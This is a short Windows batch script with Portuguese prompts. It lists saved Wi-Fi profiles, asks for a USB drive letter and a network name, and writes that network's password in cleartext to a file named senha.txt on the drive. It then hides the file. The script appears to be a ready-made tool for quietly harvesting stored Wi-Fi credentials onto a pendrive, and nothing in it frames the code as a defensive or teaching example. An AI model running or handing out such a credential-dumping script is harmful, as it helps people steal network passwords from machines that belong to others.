@echo off
color 2
cls
netsh wlan show profiles
set /p unity=Letra do pendrive Exeplo>> H: ou K: por aí vai
set /p wifi=Digite o Nome da Rede Wifi:
goto :action

:action
%unity%
netsh wlan show profiles "%wifi%" key=clear > senha.txt
attrib senha.txt +h